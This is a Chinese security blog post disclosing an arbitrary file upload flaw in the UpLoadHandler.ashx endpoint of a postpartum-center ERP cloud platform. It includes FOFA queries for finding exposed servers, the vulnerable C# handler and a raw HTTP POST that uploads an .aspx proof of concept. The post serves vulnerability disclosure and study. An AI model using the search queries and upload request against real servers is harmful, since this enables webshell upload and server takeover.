---
title: "月子会所ERP管理云平台 UpLoadHandler.ashx 任意文件上传漏洞"
source: https://mrxn.net/jswz/mamabaohe-UpLoadHandler-rce.html
asset_dir: assets/月子会所erp管理云平台-uploadhandler.ashx-任意文件上传漏洞
---

# 月子会所ERP管理云平台 UpLoadHandler.ashx 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/26 08:26
* 904浏览
* [0评论](#comment)
* 31分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件。月子会所ERP管理云平台的 Page/BasicInfo/ashx/UpLoadHandler.ashx 接口存在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，攻击者可利用该漏洞上传webshell获取服务器权限。

企业资源规划

# fofa语法

> `body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"`

# 漏洞分析

UpLoadHandler 的业务逻辑实现如下

```
public class UpLoadHandler : IHttpHandler
{

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        HttpFileCollection flist = context.Request.Files;
        string UploadfileURLList = "";
        if (context.Request.Files.Count > 0)
        {
            for (int i = 0; i < context.Request.Files.Count; i++)
            {
                HttpPostedFile mypost = flist[i];
                //if (mypost.ContentLength > 0)
                //{

                string picneme = mypost.FileName;
                string tuozhanming = picneme.Substring(picneme.LastIndexOf(".")).ToLower();     //拓展名
                                                                                                //if (tuozhanming == ".xlsx" || tuozhanming == ".docx" || tuozhanming == ".doc" || tuozhanming == ".xls")
                                                                                                //{
                string newname = GetNewName(tuozhanming);
                UploadfileURLList += newname + "|";
                string uploadUrl = ConfigurationManager.AppSettings["UPLOAD_CONTACT_URL"];
                var uploadFileName = HttpContext.Current.Server.MapPath("../" + uploadUrl);
                if (!Directory.Exists(uploadFileName))
                {
                    Directory.CreateDirectory(uploadFileName);
                }
                mypost.SaveAs(context.Server.MapPath("../" + uploadUrl + newname));
                //mypost.SaveAs(context.Server.MapPath("../../../UploadfileURL/" + newname));
                System.Threading.Thread.Sleep(100);
                //}
                //}

            }
            UploadfileURLList = UploadfileURLList.Substring(0, UploadfileURLList.Length - 1);
        }
        context.Response.Write(UploadfileURLList);
    }

    public string GetNewName(string name)
    {
        string time = DateTime.Now.ToString("yy-MM-dd");
        string newname = time.Replace("-", "").Replace(" ", "").Replace(":", "").Replace("年", "").Replace("月", "").Replace("日", "").Replace("/", "");
        return newname + new Random().Next(0000000, 9999999) + name;
    }
```

上传路径由配置文件里的 UPLOAD\_CONTACT\_URL 决定，而它默认配置为 `UploadBaseFolder/Contact/` ，朴实无华的上传+常规的重命名等处理，并无特殊后缀过滤，且会**回显保存的文件名**，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /Page/BasicInfo/ashx/UpLoadHandler.ashx HTTP/1.1
Host: mamabaohe.mrxn.net
Content-Type: multipart/form-data; boundary=--WebKitFormBoundaryWPL35TV23dfr1cNr

--WebKitFormBoundaryWPL35TV23dfr1cNr
Content-Disposition: form-data; name="file"; filename="t.aspx"

<%@Page Language="C#"%><%Response.Write(DateTime.Now.ToString());System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
--WebKitFormBoundaryWPL35TV23dfr1cNr--
```

[![月子会所ERP管理云平台 UpLoadHandler.ashx 任意文件上传漏洞](images/img-001-cd9c1e391c96.webp)](https://image.mrxn.net/d007d912d9374d6188c097e755d22c1e.webp)

成功上传测试POC并回显文件名，因此上传后的文件访问路径： UploadBaseFolder/Contact/回显文件名

云存储

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.fofa语法](#toc-2-)
* [3.漏洞分析](#toc-3-)
* [4.漏洞复现](#toc-4-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[月子会所ERP管理云平台 UpLoadHandler.ashx 任意文件上传漏洞](https://mrxn.net/jswz/mamabaohe-UpLoadHandler-rce.html)  
文章链接：<https://mrxn.net/jswz/mamabaohe-UpLoadHandler-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-UpLoadHandler-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞修复方案

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-UpLoadHandler-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
